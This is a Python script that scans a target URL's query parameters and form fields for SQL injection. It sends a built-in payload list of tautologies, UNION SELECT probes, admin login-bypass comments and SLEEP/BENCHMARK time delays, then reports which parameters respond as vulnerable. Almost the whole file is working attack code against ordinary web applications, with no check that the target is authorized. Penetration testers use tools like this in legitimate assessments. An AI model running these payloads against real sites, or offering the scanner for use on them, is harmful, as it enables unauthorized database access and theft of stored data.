#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
from termcolor import colored
import time
import urllib.parse

class SQLIScanner:
    def __init__(self, target):
        self.target = target
        self.vulnerable_params = []
        self.payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "') OR '1'='1",
            "1' ORDER BY 1--",
            "1' ORDER BY 2--",
            "1' ORDER BY 3--",
            "1' GROUP BY 1,2--",
            "1' GROUP BY 1,2,3--",
            "1' UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'--",
            "admin' --",
            "admin' #",
            "admin'/*",
            "1' AND SLEEP(5)--",
            "1' AND BENCHMARK(5000000,ENCODE('MSG','by 5 seconds'))--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        ]
        
    def extract_params(self, url):
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        return params
        
    def test_param(self, url, param, value):
        print(colored(f"[*] Testing parameter: {param}", "cyan"))
        
        for payload in self.payloads:
            # Test GET parameters
            test_url = url.replace(f"{param}={value}", f"{param}={payload}")
            try:
                start_time = time.time()
                response = requests.get(test_url, timeout=10)
                end_time = time.time()
                
                # Time-based detection
                if end_time - start_time > 5:
                    print(colored(f"[!] Time-based SQL injection found in parameter: {param}", "red"))
                    print(colored(f"    Payload: {payload}", "yellow"))
                    self.vulnerable_params.append({
                        "param": param,
                        "type": "time-based",
                        "payload": payload,
                        "url": test_url
                    })
                    return True
                
                # Error-based detection
                error_keywords = ["sql", "mysql", "postgresql", "oracle", "syntax"]
                if any(keyword in response.text.lower() for keyword in error_keywords):
                    print(colored(f"[!] Error-based SQL injection found in parameter: {param}", "red"))
                    print(colored(f"    Payload: {payload}", "yellow"))
                    self.vulnerable_params.append({
                        "param": param,
                        "type": "error-based",
                        "payload": payload,
                        "url": test_url
                    })
                    return True
                
                # Boolean-based detection
                original_response = requests.get(url, timeout=10)
                if len(response.text) != len(original_response.text):
                    print(colored(f"[!] Boolean-based SQL injection found in parameter: {param}", "red"))
                    print(colored(f"    Payload: {payload}", "yellow"))
                    self.vulnerable_params.append({
                        "param": param,
                        "type": "boolean-based",
                        "payload": payload,
                        "url": test_url
                    })
                    return True
                    
            except requests.exceptions.RequestException as e:
                print(colored(f"[!] Error testing {param}: {str(e)}", "red"))
                continue
                
        return False
        
    def scan(self):
        print(colored("\n[*] Starting SQL Injection Scanner...", "cyan"))
        print(colored("=" * 50, "cyan"))
        
        try:
            # Get initial page
            response = requests.get(self.target, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find all forms
            forms = soup.find_all('form')
            
            # Test URL parameters
            params = self.extract_params(self.target)
            for param, value in params.items():
                self.test_param(self.target, param, value[0])
            
            # Test form parameters
            for form in forms:
                inputs = form.find_all('input')
                for input_field in inputs:
                    if input_field.get('name'):
                        param = input_field['name']
                        value = input_field.get('value', '')
                        self.test_param(self.target, param, value)
            
            # Print summary
            if self.vulnerable_params:
                print(colored("\n[+] SQL Injection Vulnerabilities Found:", "green"))
                for vuln in self.vulnerable_params:
                    print(colored(f"\nParameter: {vuln['param']}", "yellow"))
                    print(colored(f"Type: {vuln['type']}", "yellow"))
                    print(colored(f"Payload: {vuln['payload']}", "yellow"))
                    print(colored(f"URL: {vuln['url']}", "yellow"))
            else:
                print(colored("\n[-] No SQL injection vulnerabilities found.", "green"))
                
        except requests.exceptions.RequestException as e:
            print(colored(f"[!] Error scanning target: {str(e)}", "red"))
            return False
            
        return True 